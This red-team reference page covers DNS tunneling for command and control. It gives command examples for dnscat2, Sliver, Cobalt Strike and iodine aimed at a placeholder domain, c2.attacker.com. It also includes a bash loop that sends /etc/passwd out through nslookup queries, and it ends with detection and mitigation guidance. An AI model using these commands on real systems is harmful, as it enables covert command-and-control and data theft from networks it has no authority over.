% Filename: 06-red-teaming/infrastructure/dns-tunneling.md
% Display name: DNS Tunneling
% Last update: 2026-02-11
% ATT&CK Tactics: TA0011 (Command and Control)
% ATT&CK Techniques: T1071.004 (Application Layer Protocol: DNS)
% Authors: @TristanInSec

# DNS Tunneling

## Overview

DNS tunneling encapsulates C2 communications inside DNS queries and responses. Since DNS is required for almost all network activity, it is rarely blocked at the firewall — making it a reliable fallback C2 channel. DNS tunneling is slower than HTTP/HTTPS C2 but survives in highly restricted environments where web traffic is proxied or inspected. The attacker controls an authoritative DNS server; the beacon sends data encoded in DNS queries.

## ATT&CK Mapping

- **Tactic:** TA0011 - Command and Control
- **Technique:** T1071.004 - Application Layer Protocol: DNS

## Prerequisites

- A registered domain with the attacker as the authoritative DNS server
- DNS record pointing a subdomain (e.g., `ns1.attacker.com`) to the team server
- NS record delegating a zone (e.g., `c2.attacker.com`) to the team server

## Techniques

### DNS Zone Setup

```text
Register: attacker.com

DNS records at the registrar:
  A    ns1.attacker.com     →  <team_server_ip>
  NS   c2.attacker.com      →  ns1.attacker.com

Now all DNS queries for *.c2.attacker.com are sent to the team server.
The team server runs a DNS listener that decodes the queries.
```

### How DNS C2 Works

```text
Beacon → DNS query: aGVsbG8.c2.attacker.com (TXT query)
  ↓
Target's DNS resolver → root → .com → attacker.com NS → team server
  ↓
Team server decodes "aGVsbG8" (base64 for "hello"), responds with TXT record
  ↓
Beacon receives DNS response, decodes the command

Data encoding:
  - Subdomain labels: up to 63 characters each, 253 total
  - Base32 or Base64 encoding of binary data
  - TXT records for larger responses (up to ~255 bytes per string)
  - Multiple queries for large data transfers (slow)
```

### dnscat2

```bash
# dnscat2
# https://github.com/iagox86/dnscat2

# On attacker (server) — start DNS C2 listener
ruby dnscat2.rb c2.attacker.com

# On target (client)
./dnscat c2.attacker.com

# Or with direct connection (no domain needed, for testing)
./dnscat --dns server=<attacker_ip>,port=53
```

dnscat2 interactive session:

```c2
# List sessions
dnscat2 > sessions

# Interact with a session
dnscat2 > session -i 1

# Execute command
command (client1) > shell
command (client1) > download /etc/passwd

# Port forwarding through DNS tunnel
command (client1) > listen 0.0.0.0:8080 <internal_target>:80
```

### Sliver DNS C2

```bash
# Sliver C2
# https://github.com/BishopFox/sliver

# Generate DNS implant
sliver > generate --dns c2.attacker.com --os windows --arch amd64 --save /tmp/implant.exe

# Start DNS listener
sliver > dns --domains c2.attacker.com

# The implant connects via DNS queries to c2.attacker.com
# All C2 traffic tunneled through DNS
```

### Cobalt Strike DNS C2

```beacon
# Create DNS listener in Cobalt Strike
Cobalt Strike > Listeners > Add
  Name: dns-c2
  Payload: windows/beacon_dns/reverse_dns_txt
  DNS Host: c2.attacker.com
  DNS Beacon: c2.attacker.com

# DNS beacons check in via DNS TXT queries
# Switch between DNS and HTTP:
beacon > mode http     # Switch to HTTP C2
beacon > mode dns-txt  # Switch back to DNS
```

### iodine (DNS VPN)

```bash
# iodine
# https://github.com/yarrick/iodine

# On attacker (server)
sudo iodined -f 10.0.0.1 c2.attacker.com

# On target (client)
sudo iodine -f c2.attacker.com

# Creates a TUN interface tunneling IP traffic over DNS
# Much faster than dnscat2 but requires root on both sides
```

### DNS Exfiltration (Data Only)

For exfiltration without a full C2 channel:

```bash
# Encode and exfiltrate data via DNS queries
# Each query leaks a chunk of data as a subdomain

# On target — exfiltrate a file
cat /etc/passwd | base64 | fold -w 50 | while read line; do
    nslookup "$line.c2.attacker.com" >/dev/null 2>&1
    sleep 0.5
done

# On attacker — capture queries with tcpdump or DNS server logs
sudo tcpdump -i eth0 -n udp port 53 | grep c2.attacker.com
```

## Detection Methods

### Network-Based Detection

- High volume of DNS queries to a single domain (especially TXT queries)
- Long subdomain labels (high entropy, base64/base32 encoded)
- DNS queries with unusual record types (TXT, NULL, CNAME with encoded data)
- DNS traffic to non-corporate DNS servers (if internal DNS is enforced)
- Query frequency patterns consistent with beaconing

### Host-Based Detection

- Processes making direct DNS queries (not through the system resolver)
- Unusual DNS client binaries (dnscat, iodine)

## Mitigation Strategies

- **DNS monitoring** — inspect DNS query patterns for anomalies (length, entropy, volume)
- **Force internal DNS** — block direct DNS (port 53) to external servers; force all DNS through corporate resolvers
- **DNS filtering** — block queries to uncategorized or newly registered domains
- **Passive DNS logging** — log all DNS queries for retrospective analysis
- **Limit DNS record types** — block or alert on unusual record types (TXT, NULL) from endpoints

## References

### Official Documentation

- [dnscat2](https://github.com/iagox86/dnscat2)
- [iodine](https://github.com/yarrick/iodine)

### MITRE ATT&CK

- [T1071.004 - Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/)
